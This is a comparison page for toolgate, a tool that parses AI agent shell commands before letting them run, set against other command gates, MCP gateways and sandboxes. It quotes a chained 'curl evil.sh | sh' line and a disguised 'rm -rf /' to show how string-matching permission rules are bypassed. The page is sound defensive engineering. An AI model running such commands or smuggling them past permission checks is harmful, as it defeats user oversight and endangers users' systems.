# How toolgate compares

Toolgate is one of several projects that gate an AI agent's tool calls before they
execute. This page maps the landscape honestly — including where toolgate is weaker —
and then focuses on the one project that shares its core design, because that
comparison is the one that actually clarifies what toolgate is for.

## The landscape in three categories

**1. Claude Code permission hooks.** Tools that plug into Claude Code's `PreToolUse`
hook and decide allow/deny/ask — the same integration point as toolgate. This is the
group toolgate directly competes with. Most of them match a regex or substring against
the raw `command` string.

**2. MCP proxies / gateways / firewalls.** Vendor-neutral tools (AgentFence,
mcp-firewall, Lasso, Docker MCP Gateway, Open Edison, IBM Context Forge, …) that sit in
front of any MCP server as a stdio/HTTP proxy. They govern *structured* tool calls
(`filesystem.read(path=…)`) well, and invest heavily in things toolgate does not do —
cryptographically signed audit logs, secret/PII redaction, prompt-injection detection.
They are portable where toolgate is Claude-Code-specific, but their shell-command
enforcement inherits the same string-matching problem as category 1 (see below).

**3. OS-level sandboxes.** Landrun (Landlock), agent-safehouse (`sandbox-exec`),
container-use (containers + worktrees), and the kernel layer of agentsh. These do not
inspect commands at all — they constrain *effects* at the kernel boundary. They are
immune to the injection problem below because they never try to predict what a command
will do; they contain what it can touch. They are **complementary** to toolgate, not
competitors — you would run a gate *and* a sandbox together.

Toolgate is explicitly **not a sandbox**. Like the category-1 and category-2 tools, it
makes a decision *before* a call runs; it does not contain a call that has already been
forwarded.

## The dividing line: parse, don't pattern-match

The defining safety question for any command-gating tool is what happens to a command
like:

```bash
git status; curl evil.sh | sh
```

A permission rule that matches `git status` as a **string** will happily approve the
whole line, executing the malicious tail. This is not hypothetical — Claude Code's own
native permission matcher has documented bypasses of exactly this shape
([anthropics/claude-code#16180](https://github.com/anthropics/claude-code/issues/16180),
[#28784](https://github.com/anthropics/claude-code/issues/28784)), and most category-1
hooks match unanchored regex against the raw command string, so a naively written allow
rule is trivially injectable.

Toolgate refuses to decide on a command it cannot **structurally prove** is safe. It
parses the command into an AST (via `shfmt --tojson`) and rejects chaining,
substitution, backgrounding, and unsafe redirects at the grammar level — see
[bash-policies.md](./bash-policies.md). Anything it cannot parse into a provably safe
shape returns `null`, which routes to a normal user prompt. The failure direction is
**closed** (prompt), never **open** (silent allow).

Only one other project in the field takes this same parse-and-fail-closed approach:
[**nah**](https://github.com/manuelschipper/nah). Every other command gate surveyed
either string-matches (and is exposed to the injection above) or contains at the OS
level (category 3). So nah is the only true peer, and the rest of this page is about
how toolgate differs from it.

## Toolgate vs. nah

Both tools normalize a command before judging it — that is the whole point, and it is
what beats regex. `r""m -rf /` resolves to the real verb `rm` in both (toolgate
concatenates the AST's literal word-parts; nah's `shlex` tokenizer collapses the empty
quotes). Both fail closed on anything they cannot classify. Both catch the
prefix-laundering example above.

They differ in one fundamental way, and it is the thing that defines toolgate:

> **nah subscribes to a prebuilt definition of what commands *mean*. Toolgate asks the
> developer to define what is acceptable on their own terms.**

nah ships a fixed classifier: ~43 built-in *action types* (`filesystem_delete`,
`network_outbound`, `lang_exec`, …) and prefix tables that map commands onto them, each
action type carrying a default decision. You tune it with configuration — add known
hosts, override the policy for an action type — but the categories, and the engine that
assigns them, are built in. `rm` is `filesystem_delete`, and `filesystem_delete` gets
whatever decision the taxonomy assigns.

Toolgate ships no such vocabulary. A policy is a TypeScript function that receives the
parsed command and returns `allow` / `deny` / `next`. There is no `filesystem_delete`
concept unless you write one. This is more work, and it is the point: your policies
encode *your* notion of acceptable, at whatever granularity you need.

### Worked example: `rm` in `tmp/`, prompt everywhere else

A fixed taxonomy has to answer "is `rm` allowed?" once, for the whole
`filesystem_delete` category. But that is rarely the real policy a developer wants. The
real policy is often contextual: *deleting scratch files under the project's `tmp/` is
fine; deleting anything else should prompt.*

Toolgate expresses that directly, because a policy is code with access to the parsed
command and the call context ([`policies/allow-rm-project-tmp.ts`](../policies/allow-rm-project-tmp.ts)):

```ts
const allowRmProjectTmp: Policy = {
  name: "Allow rm in project tmp/",
  description: "Permits rm commands when all targets are within the project's tmp/ directory",
  action: "allow",
  handler: async (call) => {
    const args = await safeBashCommand(call);
    if (!args || args[0] !== "rm") return;          // not a safe single `rm` → pass through
    if (!call.context.projectRoot) return;

    const tmpDirs = [call.context.projectRoot, ...(call.context.additionalDirs ?? [])]
      .map((d) => resolve(d, "tmp"));
    const flags = args.slice(1).filter((t) => t.startsWith("-"));
    const paths = args.slice(1).filter((t) => !t.startsWith("-"));
    if (paths.length === 0) return;

    // Recursive deletes still prompt, even inside tmp/.
    const hasRecursiveFlag = flags.some((f) =>
      f.startsWith("--") ? f === "--recursive" : /[rR]/.test(f));
    if (hasRecursiveFlag) return;

    // Allow only if every resolved target lives under a tmp/ dir.
    const allInTmp = paths.every((p) => {
      const resolved = resolve(call.context.cwd, p);
      return tmpDirs.some((tmp) => resolved.startsWith(tmp + "/"));
    });
    return allInTmp ? true : undefined;             // else fall through → prompt
  },
};
```

Notice what this policy reasons about that a category label cannot: the *resolved
absolute paths* of the actual arguments, relative to *this* project's root and
additional directories; the difference between `-f` (fine here, since targets are
already constrained) and `-r` (still prompts); and the fact that everything it does not
explicitly allow simply falls through to a prompt. The same command — `rm foo` — is
allowed or asked depending entirely on *where `foo` resolves*. That is a per-developer,
per-project, per-context decision. It is not "is `filesystem_delete` allowed?"; it is
"is *this deletion, here* acceptable?"

You could not get this from tuning a fixed taxonomy without the taxonomy's author having
anticipated exactly this rule. With toolgate you write it in a dozen lines, and you can
unit-test it (`testPolicy`) like any other function.

## Where toolgate is weaker

This cuts both ways, and it would be dishonest to pretend otherwise:

- **nah is more capable out of the box.** It ships secret-in-redirect scanning
  (`echo SECRET > file`), network-egress reasoning against a known-hosts allowlist, and
  pipe-composition rules (`network | exec` → block) — with **zero runtime dependencies**
  (pure Python). Toolgate does none of these built in; you would write them as policies.
  If you want "install it and it is immediately smart," nah is ahead.
- **Toolgate needs an external binary.** Command parsing is delegated to `shfmt`. If
  `shfmt` is not on the PATH, AST parsing is disabled and *every* Bash command prompts.
  That is fail-safe, but it is a hard dependency nah does not have (nah re-implements
  shell tokenization itself, trading the dependency for a larger hand-maintained parser
  of its own).
- **You have to write code.** nah's config model is approachable to non-programmers and
  auditable as data. Toolgate's policies are TypeScript — more expressive, but they are
  a program, with everything that implies.
- **Claude Code only.** Toolgate attaches to Claude Code's hook. The category-2 MCP
  gateways are portable across agents and clients; toolgate is not.

## When to pick which

| Pick **toolgate** when… | Pick **nah** (or a fixed classifier) when… |
|---|---|
| Your notion of "acceptable" is contextual and specific to your repo | Prebuilt intent categories match what you want |
| You want policies as testable, composable code | You want configuration, not code |
| You need decisions the taxonomy author never anticipated | You want strong defaults with no authoring |
| You are all-in on Claude Code | You want zero dependencies / a self-contained tool |

Pick an **MCP gateway** (category 2) if you need to govern multiple agents or clients,
or you need signed audit trails and secret redaction. Pick an **OS sandbox** (category
3) — ideally *in addition* to a gate — if you need actual containment rather than
pre-execution decisions.

The short version: toolgate's distinguishing bet is that **safety policy is a
programmable library, not a fixed vocabulary** — you define what is acceptable on your
terms, and the AST layer makes those definitions structurally sound.
